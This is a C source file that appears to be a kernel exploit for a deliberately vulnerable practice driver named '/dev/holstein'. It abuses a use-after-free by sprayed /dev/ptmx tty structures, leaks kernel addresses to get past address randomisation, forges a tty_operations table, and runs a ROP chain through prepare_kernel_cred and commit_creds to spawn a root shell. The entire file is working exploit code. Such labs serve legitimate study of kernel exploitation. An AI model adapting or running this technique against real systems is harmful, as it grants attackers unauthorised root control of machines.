#define _GNU_SOURCE
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sched.h>
#include <sys/mman.h>
#include <signal.h>
#include <sys/syscall.h>
#include <sys/ioctl.h>
#include <linux/userfaultfd.h>
#include <sys/wait.h>
#include <poll.h>
#include <unistd.h>
#include <stdlib.h>
#include <sys/prctl.h>
#include <sys/shm.h>
#include <sys/xattr.h>
#include <string.h>
#include <stddef.h>
#include "tty.h"
#define PAGE 0x1000
#define log_info(...) { \
    printf("[*] "); \
    printf(__VA_ARGS__); \
    putchar('\n'); \
};
#define log_err(...) { \
    printf("[!] "); \
    printf(__VA_ARGS__); \
    putchar('\n'); \
};
#define errExit(...){ \
    log_err(__VA_ARGS__); \
    exit(-1); \
};
u_int64_t user_ip;
u_int64_t user_cs;
u_int64_t user_rflags;
u_int64_t user_sp;
u_int64_t user_ss;
void get_shell(){
    if(getuid()){
        puts("Cuts");
        exit(-1);
    }
    log_info("Rooted!");
    char *argv[]={"/bin/sh",NULL};
    char *envp[]={NULL};
    execve(argv[0],argv,envp);
    // // // system("/bin/sh");
}
void save_state(){
    __asm__(
        ".intel_syntax noprefix;"
        "mov user_cs, cs;"
        "mov user_ss, ss;"
        "mov user_sp, rsp;"
        "pushf;"
        "pop user_rflags;"
        ".att_syntax;"
    );
    user_ip = get_shell;
    log_info("Saved user state");
}

#define pause() getchar()
#define BUFFER_SIZE 0x400
#define dev_file "/dev/holstein"
int global_fd;
int dup_fd;
void open_dev(){
    global_fd = open(dev_file,O_RDWR);
    dup_fd    = open(dev_file,O_RDWR);
    if(global_fd < 0 || dup_fd < 0)
        errExit("open");
    log_info("Opened dev file");
}
char buf[BUFFER_SIZE];
void read_dev(int target_fd){
    read(target_fd,buf,BUFFER_SIZE);
}
void write_dev(int target_fd){
    write(target_fd,buf,BUFFER_SIZE);
}

int ptmx_fd;
int64_t _text,g_buf,modprobe_path;

void AAW_32(int32_t value,int32_t* addr){
    ioctl(ptmx_fd,value,addr);
}

int main(int argc,char** argv,char **envp){
    save_state();
    open_dev();
    close(dup_fd);
    ptmx_fd = open("/dev/ptmx",O_RDONLY);
    open("/dev/ptmx",O_RDONLY); //allocate freed chunk
    if(ptmx_fd < 0)
        errExit("ptmx");
    read_dev(global_fd);
    int64_t* leak =(int64_t *)buf;
    _text = leak[3]-0xc39c60;
    log_info("Leak kernel .data: 0x%lx",leak[3]);
    log_info("-> _text @ 0x%lx",_text);
    g_buf = leak[7]-0x38;
    log_info("g_buf = 0x%lx",g_buf);
    struct tty_operations fake_tty ={0};
    fake_tty.ioctl = _text+0x4d124b; // push rdx ; add byte ptr [rbx + 0x41], bl ; pop rsp ; pop r13 ; pop rbp ; ret
    memcpy(&buf[0x2e0],&fake_tty,sizeof(fake_tty)); // size of tty_struct is 0x2e0;
    leak[3] = g_buf+0x2e0;

    int64_t* rop = &buf[0x2e0+offsetof(struct tty_operations,compat_ioctl)];
    u_int64_t off = 0;
    rop[off++] = 0; //r13
    rop[off++] = 0; //rbp
    rop[off++] = _text + 0x14078a; //pop rdi ; ret
    rop[off++] = 0;
    rop[off++] = _text + 0x72560; // prepare_kernel_cred
    rop[off++] = _text + 0x2e8d3b; // pop rdx ; pop rcx ; pop rbx ; pop rbp ; ret
    rop[off++] = 0; // rdx
    rop[off++] = -1;// rcx
    rop[off++] = 0; // rbx
    rop[off++] = 0; // rbp
    rop[off++] = _text + 0x2989b2; // add rdx, rax ; jmp 0xffffffff812989c0 -> cmp cl,BYTE PTR [rax]; je 0xffffffff812989b7; ret
    rop[off++] = _text + 0x14078a; //pop rdi ; ret
    rop[off++] = 0;    
    rop[off++] = _text + 0x2bff4;  // or rdi, rax ; cmp rdx, rdi ; jne 0xffffffff8102bffd ; ret
    rop[off++] = _text + 0x723c0; // commit_creds
    rop[off++] = _text + 0x800e10+22; //swapgs_restore_regs_and_return_to_usermode+22
    rop[off++] =  0;//rax
    rop[off++] =  0;//rdi
    rop[off++] = user_ip;
    rop[off++] = user_cs;
    rop[off++] = user_rflags;
    rop[off++] = user_sp;
    rop[off++] = user_ss;
    write_dev(global_fd);
    ioctl(ptmx_fd,0,g_buf+0x2e0+offsetof(struct tty_operations,compat_ioctl));
    getchar();
}
